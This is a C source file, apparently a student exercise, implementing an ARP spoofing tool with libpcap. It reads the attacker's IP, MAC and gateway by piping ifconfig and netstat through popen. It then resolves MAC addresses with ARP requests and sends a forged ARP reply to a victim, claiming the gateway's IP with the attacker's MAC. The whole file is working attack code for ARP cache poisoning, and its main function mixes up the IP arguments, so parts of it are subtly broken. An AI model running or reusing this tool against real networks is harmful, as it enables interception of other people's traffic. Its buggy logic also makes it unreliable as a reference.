#include <stdio.h>
#include <pcap.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>

void attacker_network_info(char *dev, struct in_addr *attacker_ip, struct ether_addr *attacker_mac, struct in_addr *gateway_ip){
	char cmd[200], ip_imm[50], mac_imm[50], gateway_ip_imm[50];
	FILE *fp;

	sprintf(cmd, "ifconfig | grep -A 1 '%s' | grep 'inet addr' | awk '{print $2}' | awk -F':' '{print $2}'",dev);

	fp = popen(cmd, "r");
	fgets(ip_imm, sizeof(ip_imm), fp);
	pclose(fp);

	printf("attacker's ip: %s\n", ip_imm);

	inet_aton(ip_imm, attacker_ip);
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	sprintf(cmd, "ifconfig | grep '%s' | awk '{print$5}'",dev);
	
	fp = popen(cmd, "r");
	fgets(mac_imm, sizeof(mac_imm), fp);
	pclose(fp);

	printf("attacker's mac: %s\n", mac_imm);

	ether_aton_r(mac_imm, attacker_mac);
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	sprintf(cmd, "netstat -rn |grep -A 1 'Gateway' | awk '{print $2}' | awk '{print $1}' | tail -n 1");

	fp=popen(cmd, "r");
	fgets(gateway_ip_imm, sizeof(gateway_ip_imm), fp);
	pclose(fp);

	printf("attacker's gateway ip: %s\n", gateway_ip_imm);

	inet_aton(gateway_ip_imm, gateway_ip);
}

void arp_request(pcap_t *handle, struct in_addr * sender_ip, struct ether_addr *sender_mac, struct in_addr *target_ip, struct ether_addr *target_mac) {
	struct ether_header ether;
	struct ether_header *ether_reply;
	struct ether_arp arp;
	struct ether_arp *arp_reply;
	struct ether_addr destination, source;
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	struct pcap_pkthdr header;
	const u_char *reply;
	//struct ether_addr target_ip;
	//int i;
	char mac_imm[50];

	ether.ether_type = htons(ETHERTYPE_ARP); 

	ether_aton_r("ff:ff:ff:ff:ff:ff", &destination);

	memcpy(ether.ether_dhost, &destination.ether_addr_octet, ETHER_ADDR_LEN);

	memcpy(ether.ether_shost, sender_mac->ether_addr_octet, ETHER_ADDR_LEN);

	arp.arp_hrd = htons(ARPHRD_ETHER);
	arp.arp_pro = htons(ETHERTYPE_IP);
	arp.arp_hln = ETHER_ADDR_LEN;
	arp.arp_pln = sizeof(struct in_addr);
	arp.arp_op = htons(ARPOP_REQUEST);
	memcpy(&arp.arp_sha, sender_mac, ETHER_ADDR_LEN);
	/*for(i=0; i<6;i++)
		printf("%02X:", arp.arp_sha[i]);
	printf("\n");
	ether_ntoa_r(sender_mac, mac_imm);
	printf("attacker's mac: %s\n", mac_imm);*/

	memcpy(&arp.arp_spa, sender_ip, sizeof(struct in_addr));
	ether_aton_r("00:00:00:00:00:00", &source);
	memcpy(&arp.arp_tha, &source, ETHER_ADDR_LEN);
	memcpy(&arp.arp_tpa, target_ip, sizeof(struct in_addr));

	memcpy(packet, &ether, sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header), &arp, sizeof(struct ether_arp));
    while(1) {
    	if(pcap_sendpacket(handle, packet, sizeof(packet)) == -1)
    		printf("error\n");

    	reply = pcap_next(handle, &header);

    	if(reply != NULL) {
    		//printf("1\n");
    		ether_reply = (struct ether_header*)reply;
			
			if(ntohs(ether_reply->ether_type) != ETHERTYPE_ARP)
				continue;
			//printf("2\n");
			arp_reply = (struct ether_arp *)(reply+14);
			if(ntohs(arp_reply->arp_op) != ARPOP_REPLY)
				continue;
			//printf("3\n");
			if(memcmp(target_ip, arp_reply->arp_spa, sizeof(struct in_addr)) !=0)
				continue;
			//printf("4\n");
			if(memcmp(sender_ip, arp_reply->arp_tpa, sizeof(struct in_addr)) !=0)
				continue;
			//printf("5\n");

			memcpy(target_mac->ether_addr_octet, arp_reply->arp_sha, ETHER_ADDR_LEN);
			//printf("6\n");
			ether_ntoa_r(arp_reply->arp_sha, mac_imm);
			printf("mac: %s\n\n", mac_imm);
			break;
    	}

    }
}

void send_arp(pcap_t *handle, struct ether_addr *victim_mac, struct ether_addr *attacker_mac, struct in_addr *gateway_ip, struct in_addr *victim_ip) {
	struct ether_header ether;
	struct ether_header *ether_reply;
	struct ether_arp arp;
	struct ether_arp *arp_reply;
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	struct pcap_pkthdr header;
	const u_char *reply;
	struct ether_addr mac_reply;
	//int i;
	char mac_imm[50];
	struct ether_addr gateway_mac;

	ether.ether_type = htons(ETHERTYPE_ARP); 

	memcpy(ether.ether_dhost, victim_mac, ETHER_ADDR_LEN);

	memcpy(ether.ether_shost, attacker_mac, ETHER_ADDR_LEN);

	arp.arp_hrd = htons(ARPHRD_ETHER);
	arp.arp_pro = htons(ETHERTYPE_IP);
	arp.arp_hln = ETHER_ADDR_LEN;
	arp.arp_pln = sizeof(struct in_addr);
	arp.arp_op = htons(ARPOP_REPLY);
	memcpy(&arp.arp_sha, attacker_mac, ETHER_ADDR_LEN);
	/*for(i=0; i<6;i++)
		printf("%02X:", arp.arp_sha[i]);
	printf("\n");
	ether_ntoa_r(mac_attacker, mac_imm);
	printf("attacker's mac: %s\n", mac_imm);*/

	memcpy(&arp.arp_spa, gateway_ip, sizeof(struct in_addr));
	memcpy(&arp.arp_tha, victim_mac, ETHER_ADDR_LEN);
	memcpy(&arp.arp_tpa, victim_ip, sizeof(struct in_addr));

	memcpy(packet, &ether, sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header), &arp, sizeof(struct ether_arp));
    //while(1) {
    	if(pcap_sendpacket(handle, packet, sizeof(packet)) == -1)
    		printf("error\n");
  	

    //}
}


int main(int argc, char *argv[])
{
	char *dev, errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	struct pcap_pkthdr header;
	const u_char *packet;
	struct ether_header *ether;
	struct ip *ipv4;
	struct tcphdr *tcp;
	struct arpheader *arphdr;
	int ip_hl, tcp_hl, total_hl, data_size;
	int i;
	struct ether_addr alonso_mac;
	struct in_addr alonso_ip, gateway_ip;
	struct ether_addr gateway_mac;
	struct ether_addr dlghwns817_mac;
	struct in_addr dlghwns817_ip;

	inet_aton(argv[1], &dlghwns817_ip);


	dev = pcap_lookupdev(errbuf);
	if(dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	//printf("Device: %s\n", dev);

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	
	printf("Device: %s\n\n", dev);

	attacker_network_info(dev, &alonso_ip, &alonso_mac, &alonso_ip);
	arp_request(handle, &alonso_ip, &alonso_mac, &alonso_ip, &gateway_mac);
	arp_request(handle, &alonso_ip, &alonso_mac, &dlghwns817_ip, &dlghwns817_mac);
	send_arp(handle, &dlghwns817_mac, &alonso_mac, &alonso_ip, &dlghwns817_ip);

	
	return(0);
}
